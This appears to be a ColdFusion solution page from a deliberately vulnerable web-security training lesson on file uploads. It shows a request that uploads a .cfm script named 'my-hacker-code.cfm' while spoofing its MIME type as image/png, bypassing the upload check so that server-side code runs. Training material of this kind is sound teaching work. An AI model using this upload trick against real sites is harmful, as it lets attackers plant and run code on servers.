<cf_layout>
	<cf_lessonToolbar />
	
	<div id="content">
		<h2>Solution</h2>
		
		<div id="solutionText">
			Craft a special HTTP request such as the following:
			
<pre>
&lt;cfhttp url="http://<cfoutput>#cgi.server_name#<cfif cgi.server_port NEQ 80>:#cgi.server_port#</cfif></cfoutput>/lessons/FileUploads/upload.cfm" method="post"&gt;
	&lt;cfhttpparam file="#ExpandPath("my-hacker-code.cfm")#"
  		mimetype="image/png" 
  		type="file"
  		name="photo"&gt;
&lt;/cfhttp&gt;				
</pre>
			
			
		</div>
	</div>
	
	
</cf_layout>